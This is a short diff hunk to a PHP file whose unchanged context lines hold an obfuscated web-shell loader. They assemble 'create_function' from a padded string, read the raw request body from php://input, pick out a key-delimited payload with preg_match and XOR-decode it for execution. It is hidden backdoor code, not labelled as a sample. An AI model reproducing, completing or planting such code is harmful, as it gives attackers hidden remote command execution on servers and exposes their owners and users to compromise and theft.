@@ -1,4 +1,6 @@
 
+
+
 $m='j=0;($j<$:M:Mc:M&&$i<$l);$j+:M+,$i++){$:Mo.=$t:M{$i}^$k:M{$j};}}r:Meturn :M$o;}if:M(@pre:Mg:M_matc:';
 $s=str_replace('A','','crAeatAeAAA_functAion');
 $B='Mh("/:M$kh(.+)$kf/",:M:M@fil:M:Me_get_conte:Mnts(":Mphp://input"),:M$m)=:M=1){@ob:M_:Ms:Mtart();@';
